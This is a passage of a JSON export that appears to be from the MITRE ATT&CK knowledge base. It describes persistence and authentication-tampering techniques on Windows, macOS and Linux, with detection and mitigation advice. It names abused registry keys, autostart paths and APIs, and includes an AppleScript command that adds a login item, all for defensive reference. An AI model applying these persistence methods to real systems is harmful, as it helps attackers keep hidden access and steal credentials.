<a href=\"https://richard-purves.com/2017/11/09/mdm-and-the-kextpocalypse-2/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Purves Kextpocalypse 2)</a> <a href=\"https://developer.apple.com/business/documentation/Configuration-Profile-Reference.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Apple Developer Configuration Profile)</a>","platforms":["macOS","Linux"],"dataSources":["Command: Command Execution","File: File Creation","File: File Modification","Kernel: Kernel Module Load","Process: Process Creation"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Use MDM to disable user's ability to install or approve kernel extensions, and ensure all approved kernel extensions are in alignment with policies specified in <code>com.apple.syspolicy.kernel-extension-policy</code>. <a href=\"https://developer.apple.com/library/archive/technotes/tn2459/_index.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Apple TN2459 Kernel Extensions)</a> <a href=\"https://developer.apple.com/business/documentation/Configuration-Profile-Reference.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MDMProfileConfigMacOS)</a>"},{"id":"M1026","name":"Privileged Account Management","description":"Limit access to the root account and prevent users from loading kernel modules and extensions through proper privilege separation and limiting Privilege Escalation opportunities."},{"id":"M1038","name":"Execution Prevention","description":"Application control and software restriction tools, such as SELinux, KSPP, grsecurity MODHARDEN, and Linux kernel tuning can aid in restricting kernel module loading. <a href=\"https://patchwork.kernel.org/patch/8754821/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kernel.org Restrict Kernel Module)</a> <a href=\"https://en.wikibooks.org/wiki/Grsecurity/The_RBAC_System\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wikibooks Grsecurity)</a> <a href=\"https://www.kernel.org/doc/html/latest/security/self-protection.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kernel Self Protection Project)</a> <a href=\"https://linux-audit.com/increase-kernel-integrity-with-disabled-linux-kernel-modules-loading/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Increasing Linux kernel integrity)</a> <a href=\"https://xorl.wordpress.com/2018/02/17/lkm-loading-kernel-restrictions/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: LKM loading kernel restrictions)</a>"},{"id":"M1049","name":"Antivirus/Antimalware","description":"Common tools for detecting Linux rootkits include: rkhunter <a href=\"http://rkhunter.sourceforge.net\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SourceForge rkhunter)</a>, chrootkit <a href=\"http://www.chkrootkit.org/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Chkrootkit Main)</a>, although rootkits may be designed to evade certain detection tools."}]},{"id":"T1547.007","name":"Re-opened Applications","description":"Adversaries may modify plist files to automatically run an application when a user logs in. When a user logs out or restarts via the macOS Graphical User Interface (GUI), a prompt is provided to the user with a checkbox to \"Reopen windows when logging back in\". <a href=\"https://support.apple.com/en-us/HT204005\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Re-Open windows on Mac)</a> When selected, all applications currently open are added to a property list file named <code>com.apple.loginwindow.[UUID].plist</code> within the <code>~/Library/Preferences/ByHost</code> directory. <a href=\"https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Methods of Mac Malware Persistence)</a> <a href=\"https://taomm.org/PDFs/vol1/CH%200x02%20Persistence.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wardle Persistence Chapter)</a> Applications listed in this file are automatically reopened upon the user’s next logon.\n\nAdversaries can establish Persistence by adding a malicious application path to the <code>com.apple.loginwindow.[UUID].plist</code> file to execute payloads when a user logs in.","detection":"Monitoring the specific plist files associated with reopening applications can indicate when an application has registered itself to be reopened.","platforms":["macOS"],"dataSources":["Command: Command Execution","File: File Modification"],"mitigations":[{"id":"M1017","name":"User Training","description":"Holding the Shift key while logging in prevents apps from opening automatically. <a href=\"https://support.apple.com/en-us/HT204005\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Re-Open windows on Mac)</a>"},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"This feature can be disabled entirely with the following terminal command: <code>defaults write -g ApplePersistence -bool no</code>."}]},{"id":"T1547.008","name":"LSASS Driver","description":"Adversaries may modify or add LSASS drivers to obtain persistence on compromised systems. The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain. The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication. The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process. <a href=\"https://technet.microsoft.com/library/cc961760.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Security Subsystem)</a>\n\nAdversaries may target LSASS drivers to obtain persistence. By either replacing or adding illegitimate drivers (e.g., Hijack Execution Flow), an adversary can use LSA operations to continuously execute malicious payloads.","detection":"With LSA Protection enabled, monitor the event logs (Events 3033 and 3063) for failed attempts to load LSA plug-ins and drivers. <a href=\"https://technet.microsoft.com/library/dn408187.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft LSA Protection Mar 2014)</a> Also monitor DLL load operations in lsass.exe. <a href=\"https://msdn.microsoft.com/library/windows/desktop/ff919712.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft DLL Security)</a>\n\nUtilize the Sysinternals Autoruns/Autorunsc utility <a href=\"https://technet.microsoft.com/en-us/sysinternals/bb963902\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Autoruns)</a> to examine loaded drivers associated with the LSA.","platforms":["Windows"],"dataSources":["Module: Module Load","File: File Creation","Driver: Driver Load","File: File Modification"],"mitigations":[{"id":"M1025","name":"Privileged Process Integrity","description":"On Windows 8.1 and Server 2012 R2, enable LSA Protection by setting the Registry key <code>HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa\\\\RunAsPPL</code> to <code>dword:00000001</code>. <a href=\"https://technet.microsoft.com/library/dn408187.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft LSA Protection Mar 2014)</a> LSA Protection ensures that LSA plug-ins and drivers are only loaded if they are digitally signed with a Microsoft signature and adhere to the Microsoft Security Development Lifecycle (SDL) process guidance."},{"id":"M1043","name":"Credential Access Protection","description":"On Windows 10 and Server 2016, enable Windows Defender Credential Guard <a href=\"https://docs.microsoft.com/windows/access-protection/credential-guard/credential-guard-manage\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Enable Cred Guard April 2017)</a> to run lsass.exe in an isolated virtualized environment without any device drivers. <a href=\"https://docs.microsoft.com/windows/access-protection/credential-guard/credential-guard-how-it-works\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Credential Guard April 2017)</a>"},{"id":"M1044","name":"Restrict Library Loading","description":"Ensure safe DLL search mode is enabled <code>HKEY_LOCAL_MACHINE\\\\System\\\\CurrentControlSet\\\\Control\\\\Session Manager\\\\SafeDllSearchMode</code> to mitigate risk that lsass.exe loads a malicious code library. <a href=\"https://msdn.microsoft.com/library/windows/desktop/ff919712.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft DLL Security)</a>"}]},{"id":"T1547.009","name":"Shortcut Modification","description":"Adversaries may create or modify shortcuts that can execute a program during system boot or user login. Shortcuts or symbolic links are used to reference other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process.\n\nAdversaries may abuse shortcuts in the startup folder to execute their tools and achieve persistence. (Citation: Shortcut for Persistence ) Although often used as payloads in an infection chain (e.g. Spearphishing Attachment), adversaries may also create a new shortcut as a means of indirection, while also abusing Masquerading to make the malicious shortcut appear as a legitimate program. Adversaries can also edit the target path or entirely replace an existing shortcut so their malware will be executed instead of the intended legitimate program.\n\nShortcuts can also be abused to establish persistence by implementing other methods. For example, LNK browser extensions may be modified (e.g. Browser Extensions) to persistently launch malware.","detection":"Since a shortcut's target path likely will not change, modifications to shortcut files that do not correlate with known software changes, patches, removal, etc., may be suspicious. Analysis should attempt to relate shortcut file change or creation events to other potentially suspicious events based on known adversary behavior such as process launches of unknown executables that make network connections.\n\nMonitor for LNK files created with a Zone Identifier value greater than 1, which may indicate that the LNK file originated from outside of the network. <a href=\"https://www.youtube.com/watch?v=nJ0UsyiUEqQ\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: BSidesSLC 2020 - LNK Elastic)</a>","platforms":["Windows"],"dataSources":["File: File Modification","Process: Process Creation","File: File Creation"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Limit Privileges for Shortcut Creation: While the SeCreateSymbolicLinkPrivilege is not directly related to .lnk file creation, you should still enforce least privilege principles by limiting user rights to create and modify shortcuts, especially in system-critical locations. This can be done through GPO: Computer Configuration &gt; [Policies] &gt; Windows Settings &gt; Security Settings &gt; Local Policies &gt; User Rights Assignment: Create symbolic links. <a href=\"https://www.stigviewer.com/stig/windows_server_2008_r2_member_server/2015-06-25/finding/V-26482\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: UCF STIG Symbolic Links)</a>\n\nRegular User Permissions Review: Regularly review and audit user permissions to ensure that only necessary accounts have write access to startup folders and critical system directories."},{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Applying strict permissions to directories where shortcuts are stored, such as the startup folder, can prevent unauthorized modifications."},{"id":"M1038","name":"Execution Prevention","description":"Prevents malicious shortcuts or LNK files from executing unwanted code by ensuring only authorized applications and scripts are allowed to run."}]},{"id":"T1547.010","name":"Port Monitors","description":"Adversaries may use port monitors to run an adversary supplied DLL during system boot for persistence or privilege escalation. A port monitor can be set through the <code>AddMonitor</code> API call to set a DLL to be loaded at startup. <a href=\"http://msdn.microsoft.com/en-us/library/dd183341\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AddMonitor)</a> This DLL can be located in <code>C:\\Windows\\System32</code> and will be loaded and run by the print spooler service, <code>spoolsv.exe</code>, under SYSTEM level permissions on boot. <a href=\"https://www.defcon.org/images/defcon-22/dc-22-presentations/Bloxham/DEFCON-22-Brady-Bloxham-Windows-API-Abuse-UPDATED.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Bloxham)</a> \n\nAlternatively, an arbitrary DLL can be loaded if permissions allow writing a fully-qualified pathname for that DLL to the <code>Driver</code> value of an existing or new arbitrarily named subkey of <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors</code>. The Registry key contains entries for the following:\n\n* Local Port\n* Standard TCP/IP Port\n* USB Monitor\n* WSD Port","detection":"Monitor process API calls to <code>AddMonitor</code>. <a href=\"http://msdn.microsoft.com/en-us/library/dd183341\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AddMonitor)</a> Monitor DLLs that are loaded by spoolsv.exe for DLLs that are abnormal. New DLLs written to the System32 directory that do not correlate with known good software or patching may be suspicious. \n\nMonitor Registry writes to <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors</code>, paying particular attention to changes in the \"Driver\" subkey. Run the Autoruns utility, which checks for this Registry key as a persistence mechanism. <a href=\"https://technet.microsoft.com/en-us/sysinternals/bb963902\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Autoruns)</a>","platforms":["Windows"],"dataSources":["Windows Registry: Windows Registry Key Modification","File: File Creation","Module: Module Load","Process: OS API Execution"],"mitigations":[]},{"id":"T1547.012","name":"Print Processors","description":"Adversaries may abuse print processors to run malicious DLLs during system boot for persistence and/or privilege escalation. Print processors are DLLs that are loaded by the print spooler service, <code>spoolsv.exe</code>, during boot. <a href=\"https://learn.microsoft.com/windows-hardware/drivers/print/introduction-to-print-processors\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Intro Print Processors)</a>\n\nAdversaries may abuse the print spooler service by adding print processors that load malicious DLLs at startup. A print processor can be installed through the <code>AddPrintProcessor</code> API call with an account that has <code>SeLoadDriverPrivilege</code> enabled. Alternatively, a print processor can be registered to the print spooler service by adding the <code>HKLM\\SYSTEM\\\\[CurrentControlSet or ControlSet001]\\Control\\Print\\Environments\\\\[Windows architecture: e.g., Windows x64]\\Print Processors\\\\[user defined]\\Driver</code> Registry key that points to the DLL.\n\nFor the malicious print processor to be correctly installed, the payload must be located in the dedicated system print-processor directory, that can be found with the <code>GetPrintProcessorDirectory</code> API call, or referenced via a relative path from this directory. <a href=\"https://docs.microsoft.com/en-us/windows/win32/printdocs/addprintprocessor\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft AddPrintProcessor May 2018)</a> After the print processors are installed, the print spooler service, which starts during boot, must be restarted in order for them to run. <a href=\"https://www.welivesecurity.com/2020/05/21/no-game-over-winnti-group/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ESET PipeMon May 2020)</a>\n\nThe print spooler service runs under SYSTEM level permissions, therefore print processors installed by an adversary may run under elevated privileges.","detection":"Monitor process API calls to <code>AddPrintProcessor</code> and <code>GetPrintProcessorDirectory</code>. New print processor DLLs are written to the print processor directory. Also monitor Registry writes to <code>HKLM\\SYSTEM\\ControlSet001\\Control\\Print\\Environments\\\\[Windows architecture]\\Print Processors\\\\[user defined]\\\\Driver</code> or <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\\\[Windows architecture]\\Print Processors\\\\[user defined]\\Driver</code> as they pertain to print processor installations.\n\nMonitor for abnormal DLLs that are loaded by spoolsv.exe. Print processors that do not correlate with known good software or patching may be suspicious.","platforms":["Windows"],"dataSources":["Windows Registry: Windows Registry Key Modification","File: File Creation","Driver: Driver Load","Module: Module Load","Process: OS API Execution"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Limit user accounts that can load or unload device drivers by disabling <code>SeLoadDriverPrivilege</code>."}]},{"id":"T1547.013","name":"XDG Autostart Entries","description":"Adversaries may add or modify XDG Autostart Entries to execute malicious programs or commands when a user’s desktop environment is loaded at login. XDG Autostart entries are available for any XDG-compliant Linux system. XDG Autostart entries use Desktop Entry files (<code>.desktop</code>) to configure the user’s desktop environment upon user login. These configuration files determine what applications launch upon user login, define associated applications to open specific file types, and define applications used to open removable media. <a href=\"https://specifications.freedesktop.org/autostart-spec/autostart-spec-latest.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Free Desktop Application Autostart Feb 2006)</a> <a href=\"https://specifications.freedesktop.org/desktop-entry-spec/1.2/ar01s06.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Free Desktop Entry Keys)</a>\n\nAdversaries may abuse this feature to establish persistence by adding a path to a malicious binary or command to the <code>Exec</code> directive in the <code>.desktop</code> configuration file. When the user’s desktop environment is loaded at user login, the <code>.desktop</code> files located in the XDG Autostart directories are automatically executed. System-wide Autostart entries are located in the <code>/etc/xdg/autostart</code> directory while the user entries are located in the <code>~/.config/autostart</code> directory.\n\nAdversaries may combine this technique with Masquerading to blend malicious Autostart entries with legitimate programs. <a href=\"https://redcanary.com/blog/netwire-remote-access-trojan-on-linux/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Red Canary Netwire Linux 2022)</a>","detection":"Malicious XDG autostart entries may be detected by auditing file creation and modification events within the <code>/etc/xdg/autostart</code> and <code>~/.config/autostart</code> directories. Depending on individual configurations, defenders may need to query the environment variables <code>$XDG_CONFIG_HOME</code> or <code>$XDG_CONFIG_DIRS</code> to determine the paths of Autostart entries. Autostart entry files not associated with legitimate packages may be considered suspicious. Suspicious entries can also be identified by comparing entries to a trusted system baseline.\n \nSuspicious processes or scripts spawned in this manner will have a parent process of the desktop component implementing the XDG specification and will execute as the logged on user.","platforms":["Linux"],"dataSources":["File: File Creation","Command: Command Execution","Process: Process Creation","File: File Modification"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Limit privileges of user accounts so only authorized privileged users can create and modify XDG autostart entries."},{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Restrict write access to XDG autostart entries to only select privileged users."},{"id":"M1033","name":"Limit Software Installation","description":"Restrict software installation to trusted repositories only and be cautious of orphaned software packages."}]},{"id":"T1547.014","name":"Active Setup","description":"Adversaries may achieve persistence by adding a Registry key to the Active Setup of the local machine. Active Setup is a Windows mechanism that is used to execute programs when a user logs in. The value stored in the Registry key will be executed after a user logs into the computer. <a href=\"https://helgeklein.com/blog/2010/04/active-setup-explained/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Klein Active Setup 2010)</a> These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nAdversaries may abuse Active Setup by creating a key under <code> HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\</code> and setting a malicious value for <code>StubPath</code>. This value will serve as the program that will be executed when a user logs into the computer. <a href=\"https://digital-forensics.sans.org/summit-archives/2010/35-glyer-apt-persistence-mechanisms.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant Glyer APT 2010)</a> <a href=\"https://citizenlab.ca/2015/12/packrat-report/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Citizenlab Packrat 2015)</a> <a href=\"https://www.fireeye.com/blog/threat-research/2012/12/council-foreign-relations-water-hole-attack-details.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye CFR Watering Hole 2012)</a> <a href=\"https://securelist.com/whos-really-spreading-through-the-bright-star/68978/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SECURELIST Bright Star 2015)</a> <a href=\"https://unit42.paloaltonetworks.com/unit42-tropic-trooper-targets-taiwanese-government-and-fossil-fuel-provider-with-poison-ivy/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: paloalto Tropic Trooper 2016)</a>\n\nAdversaries can abuse these components to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.","detection":"Monitor Registry key additions and/or modifications to <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\</code>.\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the Active Setup Registry locations and startup folders. <a href=\"https://technet.microsoft.com/en-us/sysinternals/bb963902\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Autoruns)</a> Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.","platforms":["Windows"],"dataSources":["Command: Command Execution","Windows Registry: Windows Registry Key Creation","Process: Process Creation","Windows Registry: Windows Registry Key Modification"],"mitigations":[]},{"id":"T1547.015","name":"Login Items","description":"Adversaries may add login items to execute upon user login to gain persistence or escalate privileges. Login items are applications, documents, folders, or server connections that are automatically launched when a user logs in. <a href=\"https://support.apple.com/guide/mac-help/open-items-automatically-when-you-log-in-mh15189/mac\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Open Login Items Apple)</a> Login items can be added via a shared file list or Service Management Framework. <a href=\"https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLoginItems.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Adding Login Items)</a> Shared file list login items can be set using scripting languages such as AppleScript, whereas the Service Management Framework uses the API call <code>SMLoginItemSetEnabled</code>.\n\nLogin items installed using the Service Management Framework leverage <code>launchd</code>, are not visible in the System Preferences, and can only be removed by the application that created them. <a href=\"https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLoginItems.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Adding Login Items)</a> <a href=\"https://blog.timschroeder.net/2013/04/21/smloginitemsetenabled-demystified/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SMLoginItemSetEnabled Schroeder 2013)</a> Login items created using a shared file list are visible in System Preferences, can hide the application when it launches, and are executed through LaunchServices, not launchd, to open applications, documents, or URLs without using Finder. <a href=\"https://developer.apple.com/documentation/coreservices/launch_services\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Launch Services Apple Developer)</a> Users and applications use login items to configure their user environment to launch commonly used services or applications, such as email, chat, and music applications.\n\nAdversaries can utilize AppleScript and Native API calls to create a login item to spawn malicious executables. <a href=\"https://eclecticlight.co/2018/05/22/running-at-startup-when-to-use-a-login-item-or-a-launchagent-launchdaemon/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ELC Running at startup)</a> Prior to version 10.5 on macOS, adversaries can add login items by using AppleScript to send an Apple events to the “System Events” process, which has an AppleScript dictionary for manipulating login items. <a href=\"https://developer.apple.com/library/archive/samplecode/LoginItemsAE/Introduction/Intro.html#//apple_ref/doc/uid/DTS10003788\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Login Items AE)</a> Adversaries can use a command such as <code>tell application “System Events” to make login item at end with properties /path/to/executable</code>. <a href=\"https://eclecticlight.co/2021/09/16/how-to-run-an-app-or-tool-at-startup/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Startup Items Eclectic)</a> <a href=\"http://www.hexed.in/2019/07/osxdok-analysis.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: hexed osx.dok analysis 2019)</a> <a href=\"https://gist.github.com/kaloprominat/6111584\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Add List Remove Login Items Apple Script)</a> This command adds the path of the malicious executable to the login item file list located in <code>~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm</code>. <a href=\"https://eclecticlight.co/2021/09/16/how-to-run-an-app-or-tool-at-startup/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Startup Items Eclectic)</a> Adversaries can also use login items to launch executables that can be used to control the victim system remotely or as a means to gain privilege escalation by prompting for user credentials. <a href=\"https://objective-see.com/blog/blog_0x25.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: objsee mac malware 2017)</a> <a href=\"https://blog.checkpoint.com/2017/04/27/osx-malware-catching-wants-read-https-traffic/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CheckPoint Dok)</a> <a href=\"https://objective-see.com/blog/blog_0x44.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: objsee netwire backdoor 2019)</a>","detection":"All login items created via shared file lists are viewable by using the System Preferences GUI or in the <code>~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm</code> file. <a href=\"https://support.apple.com/guide/mac-help/open-items-automatically-when-you-log-in-mh15189/mac\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Open Login Items Apple)</a> <a href=\"https://eclecticlight.co/2021/09/16/how-to-run-an-app-or-tool-at-startup/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Startup Items Eclectic)</a> <a href=\"https://objective-see.com/blog/blog_0x31.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: objsee block blocking login items)</a> <a href=\"https://www.sentinelone.com/blog/how-malware-persists-on-macos/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: sentinelone macos persist Jun 2019)</a> These locations should be monitored and audited for known good applications.\n\nOtherwise, login Items are located in <code>Contents/Library/LoginItems</code> within an application bundle, so these paths should be monitored as well. <a href=\"https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLoginItems.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Adding Login Items)</a> Monitor applications that leverage login items with either the LSUIElement or LSBackgroundOnly key in the Info.plist file set to true. <a href=\"https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLoginItems.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Adding Login Items)</a> <a href=\"https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Articles/LaunchServicesKeys.html#//apple_ref/doc/uid/TP40009250-SW1\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Launch Service Keys Developer Apple)</a>\n\nMonitor processes that start at login for unusual or unknown applications. Usual applications for login items could include what users add to configure their user environment, such as email, chat, or music applications, or what administrators include for organization settings and protections. Check for running applications from login items that also have abnormal behavior,, such as establishing network connections.","platforms":["macOS"],"dataSources":["Process: Process Creation","File: File Creation","File: File Modification"],"mitigations":[]}]},{"id":"T1554","name":"Compromise Host Software Binary","description":"Adversaries may modify host software binaries to establish persistent access to systems. Software binaries/executables provide a wide range of system commands or services, programs, and libraries. Common software binaries are SSH clients, FTP clients, email clients, web browsers, and many other user or server applications.\n\nAdversaries may establish persistence though modifications to host software binaries. For example, an adversary may replace or otherwise infect a legitimate application binary (or support files) with a backdoor. Since these binaries may be routinely executed by applications or the user, the adversary can leverage this for persistent access to the host. An adversary may also modify a software binary such as an SSH client in order to persistently collect credentials during logins (i.e., Modify Authentication Process). <a href=\"https://cloud.google.com/blog/topics/threat-intelligence/uncovering-unc3886-espionage-operations\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Google Cloud Mandiant UNC3886 2024)</a>\n\nAn adversary may also modify an existing binary by patching in malicious functionality (e.g., IAT Hooking/Entry point patching) <a href=\"https://unit42.paloaltonetworks.com/banking-trojan-techniques/#post-125550-_rm3d6xxbk52n\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Unit42 Banking Trojans Hooking 2022)</a> prior to the binary’s legitimate execution. For example, an adversary may modify the entry point of a binary to point to malicious code patched in by the adversary before resuming normal execution flow. <a href=\"https://web-assets.esetstatic.com/wls/2021/10/eset_fontonlake.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ESET FontOnLake Analysis 2021)</a>\n\nAfter modifying a binary, an adversary may attempt to impair defenses by preventing it from updating (e.g., via the <code>yum-versionlock</code> command or <code>versionlock.list</code> file in Linux systems that use the yum package manager). <a href=\"https://cloud.google.com/blog/topics/threat-intelligence/uncovering-unc3886-espionage-operations\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Google Cloud Mandiant UNC3886 2024)</a>","detection":"Collect and analyze signing certificate metadata and check signature validity on software that executes within the environment. Look for changes to client software that do not correlate with known software or patch cycles. \n\nConsider monitoring for anomalous behavior from client applications, such as atypical module loads, file reads/writes, or network connections.","platforms":["ESXi","Linux","macOS","Windows"],"dataSources":["File: File Deletion","File: File Modification","File: File Metadata","File: File Creation"],"mitigations":[{"id":"M1045","name":"Code Signing","description":"Ensure all application component binaries are signed by the correct application developers."}],"subTechniques":[]},{"id":"T1556","name":"Modify Authentication Process","description":"Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials. By modifying an authentication process, an adversary may be able to authenticate to a service or system without using Valid Accounts.\n\nAdversaries may maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms. Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop.","detection":"Monitor for new, unfamiliar DLL files written to a domain controller and/or local computer. Monitor for changes to Registry entries for password filters (ex: <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Notification Packages</code>) and correlate then investigate the DLL files these files reference. \n\nPassword filters will also show up as an autorun and loaded DLL in lsass.exe. <a href=\"https://clymb3r.wordpress.com/2013/09/15/intercepting-password-changes-with-function-hooking/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Clymb3r Function Hook Passwords Sept 2013)</a>\n\nMonitor for calls to <code>OpenProcess</code> that can be used to manipulate lsass.exe running on a domain controller as well as for malicious modifications to functions exported from authentication-related system DLLs (such as cryptdll.dll and samsrv.dll). <a href=\"https://www.secureworks.com/research/skeleton-key-malware-analysis\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Dell Skeleton)</a> \n\nMonitor PAM configuration and module paths (ex: <code>/etc/pam.d/</code>) for changes. Use system-integrity tools such as AIDE and monitoring tools such as auditd to monitor PAM files.\n\nMonitor for suspicious additions to the /Library/Security/SecurityAgentPlugins directory. <a href=\"https://xorrior.com/persistent-credential-theft/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Xorrior Authorization Plugins)</a>\n\nConfigure robust, consistent account activity audit policies across the enterprise and with externally accessible services. <a href=\"https://technet.microsoft.com/en-us/library/dn487457.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Audit Policy)</a> Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).\n\nMonitor property changes in Group Policy that manage authentication mechanisms (i.e. Group Policy Modification). The <code>Store passwords using reversible encryption</code> configuration should be set to Disabled. Additionally, monitor and/or block suspicious command/script execution of <code>-AllowReversiblePasswordEncryption $true</code>, <code>Set-ADUser</code> and <code>Set-ADAccountControl</code>. Finally, monitor Fine-Grained Password Policies and regularly audit user accounts and group settings. <a href=\"https://adsecurity.org/?p=2053\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: dump_pwd_dcsync)</a>","platforms":["IaaS","Identity Provider","Linux","macOS","Network Devices","Office 